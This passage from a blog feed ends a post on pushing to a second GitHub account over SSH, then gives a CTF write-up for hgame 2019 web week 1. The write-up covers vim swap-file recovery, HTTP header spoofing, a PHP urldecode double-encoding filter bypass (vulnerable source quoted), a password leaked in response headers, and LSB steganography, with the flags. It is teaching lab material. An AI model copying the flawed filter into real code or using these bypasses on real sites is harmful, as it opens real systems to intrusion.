class="line">ssh -T K4ge</span><br></pre></td></tr></table></figure></p><h2 id="0x05-git实战"><a href="#0x05-git实战" class="headerlink" title="0x05. git实战"></a>0x05. git实战</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:K4ge/gitskills.git</span><br><span class="line">git remote rm origin</span><br><span class="line">git remote add origin git@K4ge:K4ge/gitksills.git</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m &quot;new README&quot;</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure><p>先删除当前为github.com的remote<br>然后添加新的remote为K4ge，然后就可以push到新账号了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-生成密钥&quot;&gt;&lt;a href=&quot;#0x01-生成密钥&quot; class=&quot;headerlink&quot; title=&quot;0x01.生成密钥&quot;&gt;&lt;/a&gt;0x01.生成密钥&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
      
    
    </summary>
    
      <category term="other" scheme="http://yoursite.com/categories/other/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>hgame-web-week1</title>
    <link href="http://yoursite.com/2019/02/03/hgame%E8%8D%89%E7%A8%BF/"/>
    <id>http://yoursite.com/2019/02/03/hgame草稿/</id>
    <published>2019-02-03T05:45:23.000Z</published>
    <updated>2019-05-13T12:46:12.502Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-谁吃了我的flag"><a href="#1-谁吃了我的flag" class="headerlink" title="1. 谁吃了我的flag"></a>1. 谁吃了我的flag</h2><p><img src="/img/1548569716058.png" alt=""><br>获取vim备份文件<br>vim自动退出会临时备份隐藏文件 .xxx.swp<br>用linux打<br><code>vim -r .xxx.swp</code> 可以恢复备份文件<br>hgame{3eek_diScl0Sure_fRom+wEbsit@}</p><h2 id="2-换头大作战"><a href="#2-换头大作战" class="headerlink" title="2. 换头大作战"></a>2. 换头大作战</h2><p><img src="/img/1548570653300.png" alt=""><br>输入框输入，要求使用post<br>post输入<br>要求使用waterfox，更改<br>要求bilibili登录<br>最后得到flag<br>hgame{hTTp_HeaDeR_iS_Ez}</p><h2 id="3-very-easy-web"><a href="#3-very-easy-web" class="headerlink" title="3. very easy web"></a>3. very easy web</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(strpos(&quot;vidar&quot;,$_GET[&apos;id&apos;])!==FALSE)</span><br><span class="line">  die(&quot;&lt;p&gt;干巴爹/img/p&gt;&quot;);</span><br><span class="line"></span><br><span class="line">$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]);</span><br><span class="line">if($_GET[&apos;id&apos;] === &quot;vidar&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>urldecode()函数的危险问题<br>php会进行自动解码一次<br>如果使用这个函数，可以通过二次编码绕过前面的过滤<br>hgame{urlDecode_Is_GoOd}</p><h2 id="4-can-you-find-me"><a href="#4-can-you-find-me" class="headerlink" title="4. can you find me"></a>4. can you find me</h2><p><img src="/img/1548571660564.png" alt=""><br><img src="/img/1548571688433.png" alt=""><br>从返回包头找到密码woyaoflag<br>发送post密码得到flag<br>hgame{f12_1s_aMazIng111}</p><h2 id="5-Hidden-Image-in-LSB"><a href="#5-Hidden-Image-in-LSB" class="headerlink" title="5. Hidden Image in LSB"></a>5. Hidden Image in LSB</h2><p>有StegSolve打开，按下面左右调试即可<br><img src="/img/1548572207626.png" alt=""><br>hgame{LSB_is_easy_for_u}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-谁吃了我的flag&quot;&gt;&lt;a href=&quot;#1-谁吃了我的flag&quot; class=&quot;headerlink&quot; title=&quot;1. 谁吃了我的flag&quot;&gt;&lt;/a&gt;1. 谁吃了我的flag&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/1548569716058.png
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
</feed>
